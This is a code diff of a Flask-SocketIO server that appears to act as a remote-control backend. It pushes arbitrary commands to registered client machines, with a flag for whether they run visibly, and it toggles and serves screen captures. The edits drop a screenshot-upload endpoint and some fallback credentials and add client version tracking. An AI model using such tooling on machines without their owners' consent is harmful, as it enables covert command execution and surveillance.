@@ -4,19 +4,17 @@ import sqlite3
 import base64
 
 from flask import Flask, render_template, request, jsonify, send_from_directory
-from flask_socketio import SocketIO, emit, join_room
+from flask_socketio import SocketIO, join_room
 from functools import wraps
 from dotenv import load_dotenv
 
 load_dotenv()
 
 app = Flask(__name__)
-app.config["SECRET_KEY"] = os.getenv("SECRET_KEY", "run_secret_key_12345")
 
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")
 
 DASHBOARD_PASSWORD = os.getenv("DASHBOARD_PASSWORD")
-CLIENT_KEY = os.getenv("CLIENT_KEY", DASHBOARD_PASSWORD)
 
 if not DASHBOARD_PASSWORD:
     raise RuntimeError("DASHBOARD_PASSWORD is not set")
@@ -54,15 +52,13 @@ def init_db():
         """
         CREATE TABLE IF NOT EXISTS clients (
             username TEXT PRIMARY KEY,
-            cmd TEXT,
-            run INTEGER DEFAULT 0,
             visible INTEGER DEFAULT 1,
             capture INTEGER DEFAULT 0,
+            version TEXT,
             updated_at TEXT
         )
     """
     )
-
     conn.commit()
     conn.close()
 
@@ -92,12 +88,9 @@ def handle_register(data):
         return
     username = data.get("username")
     auth_token = data.get("auth_token")
-    if not auth_token and hasattr(request, "auth") and isinstance(request.auth, dict):
-        auth_token = request.auth.get("token")
+    version = data.get("version", "")
 
-    if not auth_token or (
-        auth_token != CLIENT_KEY and auth_token != DASHBOARD_PASSWORD
-    ):
+    if not auth_token or auth_token != DASHBOARD_PASSWORD:
         print(
             f"[WebSocket Auth] Rejecting unauthenticated socket connection for username='{username}' sid='{request.sid}'"
         )
@@ -118,22 +111,24 @@ def handle_register(data):
     ).fetchone()
     if row:
         cursor.execute(
-            "UPDATE clients SET updated_at = datetime('now') WHERE username = ?",
-            (username,),
+            "UPDATE clients SET updated_at = datetime('now'), version = ? WHERE username = ?",
+            (version, username),
         )
         capture_val = bool(row["capture"])
     else:
         cursor.execute(
-            "INSERT INTO clients (username, updated_at) VALUES (?, datetime('now'))",
-            (username,),
+            "INSERT INTO clients (username, version, updated_at) VALUES (?, ?, datetime('now'))",
+            (username, version),
         )
         capture_val = False
     conn.commit()
     conn.close()
 
-    emit("set_capture", {"capture": capture_val}, room=username)
+    socketio.emit("set_capture", {"capture": capture_val}, room=username)
     socketio.emit(
-        "status_change", {"username": username, "online": True}, room="dashboard"
+        "status_change",
+        {"username": username, "online": True, "version": version},
+        room="dashboard",
     )
 
 
@@ -214,7 +209,7 @@ def get_clients():
 
     rows = conn.execute(
         """
-        SELECT username, updated_at, visible, capture
+        SELECT username, updated_at, visible, capture, version
         FROM clients
         ORDER BY updated_at DESC
     """
@@ -233,6 +228,7 @@ def get_clients():
                 "capture": (
                     bool(row["capture"]) if row["capture"] is not None else False
                 ),
+                "version": row["version"] if row["version"] is not None else "",
                 "online": row["username"] in online_usernames,
             }
             for row in rows
@@ -351,8 +347,6 @@ def set_visibility():
     conn.commit()
     conn.close()
 
-    socketio.emit("set_visibility", {"visible": visible}, room=username)
-
     return jsonify({"status": "success"})
 
 
@@ -377,18 +371,14 @@ def set_command():
         """
         INSERT INTO clients (
             username,
-            cmd,
-            run,
             visible
         )
-        VALUES (?, ?, 1, ?)
+        VALUES (?, ?)
 
         ON CONFLICT(username) DO UPDATE SET
-            cmd = excluded.cmd,
-            run = 1,
             visible = excluded.visible
     """,
-        (username, cmd, visible),
+        (username, visible),
     )
 
     conn.commit()
@@ -398,41 +388,6 @@ def set_command():
     socketio.emit("exec_command", {"cmd": cmd, "visible": visible}, room=username)
 
     return jsonify({"status": "success", "message": "Command sent over WebSocket"})
-
-
-@app.post("/api/upload")
-def upload_screenshot():
-    auth_key = request.headers.get("x-password") or request.headers.get("x-client-key")
-    if not auth_key or (auth_key != DASHBOARD_PASSWORD and auth_key != CLIENT_KEY):
-        return jsonify({"detail": "Unauthorized"}), 401
-
-    data = request.get_json(silent=True) or {}
-
-    username = data.get("username")
-    filename = data.get("filename")
-    image_base64 = data.get("image")
-
-    if not username or not filename or not image_base64:
-        return jsonify({"status": "error", "message": "Missing fields"}), 400
-
-    client_folder = os.path.join(SCREENSHOT_DIR, username)
-    os.makedirs(client_folder, exist_ok=True)
-
-    file_path = os.path.join(client_folder, filename)
-
-    try:
-        if "," in image_base64:
-            image_base64 = image_base64.split(",", 1)[1]
-
-        image_bytes = base64.b64decode(image_base64)
-
-        with open(file_path, "wb") as f:
-            f.write(image_bytes)
-
-        return jsonify({"status": "success"})
-
-    except Exception as e:
-        return jsonify({"status": "error", "message": str(e)}), 500
 
 
 @app.get("/frames/<username>/<filename>")
@@ -445,4 +400,4 @@ def get_frame(username, filename):
 
 
 if __name__ == "__main__":
-    socketio.run(app, host="0.0.0.0", port=int(os.getenv("PORT", "5002")), debug=False)
+    socketio.run(app, host="0.0.0.0", port=5002, debug=False)
